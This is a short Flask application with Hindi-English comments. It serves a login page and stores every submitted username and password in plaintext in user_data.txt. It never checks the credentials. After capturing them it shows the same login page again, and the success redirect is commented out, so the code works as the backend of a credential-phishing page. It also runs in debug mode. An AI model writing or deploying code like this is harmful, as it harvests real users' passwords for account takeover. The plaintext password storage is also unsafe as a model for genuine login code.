from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

# Text file ka naam jismein data save hoga
DATA_FILE = "user_data.txt"

def save_user_data(username, password):
    """
    User data ko text file mein save karta hai.

    Parameters:
        username (str): User ka username.
        password (str): User ka password.
    """
    try:
        with open(DATA_FILE, "a") as f:
            f.write(f"Username: {username}, Password: {password}\n")
        return True
    except Exception as e:
        print(f"Error saving data: {e}")
        return False

@app.route('/')
def index():
    """
    Main login page ko render karta hai (templates/index.html).
    """
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    """
    Login form submission ko handle karta hai.
    """
    username = request.form.get('username')
    password = request.form.get('password')

    if username and password:
        if save_user_data(username, password):
            return render_template('index.html')
            # return redirect(url_for('success', username=username))
        else:
            return "Data save karne mein error aayi.  Please try again."
    else:
        return "Invalid username or password.  Please try again."

@app.route('/success/<username>')
def success(username):
    """
    Login ke baad ek success page dikhaata hai.
    """
    return f"Logged in successfully as {username}!"

if __name__ == '__main__':
    # Check karein ki data file exist karti hai ya nahi, agar nahi karti hai toh bana de.
    if not os.path.exists(DATA_FILE):
        try:
            open(DATA_FILE, 'a').close()
        except Exception as e:
            print(f"Error creating data file: {e}")
            exit()

    app.run(port=8080,debug=True)